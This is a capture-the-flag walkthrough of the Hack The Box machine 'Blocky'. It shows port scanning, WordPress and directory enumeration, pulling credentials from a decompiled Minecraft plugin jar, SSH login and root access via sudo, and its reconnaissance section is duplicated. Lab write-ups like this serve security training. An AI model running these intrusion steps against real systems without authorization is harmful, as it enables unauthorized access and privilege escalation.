---
layout: single
title: Blocky - Hack The Box
excerpt: "Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators. "
date: 2025-05-09
classes: wide
header:
  teaser: /img2/blocky.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - WordPress Enumeration
  - Information Leakage
  - Analyzing a jar file - JD-Gui + SSH Access
  - Abusing Sudoers Privilege [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
nmap --open -sS -p- --min-rate 5000 -vvv -Pn 10.10.10.37
```

![](/img2/Pasted%20image%2020250509094207.png)

- Vulnerability and version scan with nmap

```bash
nmap -sCV -vvv 10.10.10.37
```

![](/img2/Pasted%20image%2020250509094407.png)

- Add domain to local DNS

```bash
echo "10.10.10.37 blocky.htb" >> /etc/hosts
```

- Whatweb

```bash
whatweb http://blocky.htb/
```

![](/img2/Pasted%20image%2020250509094621.png)

- Find Wordpress admin

![](/img2/Pasted%20image%2020250509094917.png)

![](/img2/Pasted%20image%2020250509095007.png)

![](/img2/Pasted%20image%2020250509095317.png)

- Gobuster

```bash
gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 
```

![](/img2/Pasted%20image%2020250509100337.png)



## Reconnaissance

- Nmap 

```bash
nmap --open -sS -p- --min-rate 5000 -vvv -Pn 10.10.10.37
```

![](/img2/Pasted%20image%2020250509094207.png)

- Vulnerability and version scan with nmap

```bash
nmap -sCV -vvv 10.10.10.37
```

![](/img2/Pasted%20image%2020250509094407.png)

- Add domain to local DNS

```bash
echo "10.10.10.37 blocky.htb" >> /etc/hosts
```

- Whatweb

```bash
whatweb http://blocky.htb/
```

![](/img2/Pasted%20image%2020250509094621.png)

- Find Wordpress admin

![](/img2/Pasted%20image%2020250509094917.png)

![](/img2/Pasted%20image%2020250509095007.png)

![](/img2/Pasted%20image%2020250509095317.png)

- Gobuster

```bash
gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 
```

![](/img2/Pasted%20image%2020250509100337.png)


## Exploitation

- Check .jar files in /plugins

![](/img2/Pasted%20image%2020250509100444.png)

```bash
7z x BlockyCore.jar
strings com/myfirstplugin/BlockyCore.class
```

![](/img2/Pasted%20image%2020250509100748.png)

- Connect ssh

```bash
ssh notch@10.10.10.37
```

![](/img2/Pasted%20image%2020250509100951.png)

## Post-exploitation

- Check notch groups

```bash
id
```

![](/img2/Pasted%20image%2020250509110400.png)

```bash
sudo su
```


![](/img2/Pasted%20image%2020250509103257.png)